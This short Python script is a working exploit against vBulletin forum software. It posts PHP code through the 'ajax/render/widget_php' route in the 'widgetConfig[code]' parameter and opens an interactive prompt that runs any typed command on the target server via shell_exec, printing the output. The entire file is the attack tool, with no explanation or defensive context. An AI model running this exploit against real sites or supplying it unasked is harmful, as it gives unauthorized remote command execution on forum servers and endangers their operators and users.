import requests
import sys

if len(sys.argv) != 2:
    sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

params = {"routestring":"ajax/render/widget_php"}

while True:
     try:
          cmd = raw_input("vBulletin$ ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
          r = requests.post(url = sys.argv[1], data = params)
          if r.status_code == 200:
               print r.text
          else:
               sys.exit("Exploit failed! :(")
     except KeyboardInterrupt:
          sys.exit("\nClosing shell...")
     except Exception, e:
          sys.exit(str(e))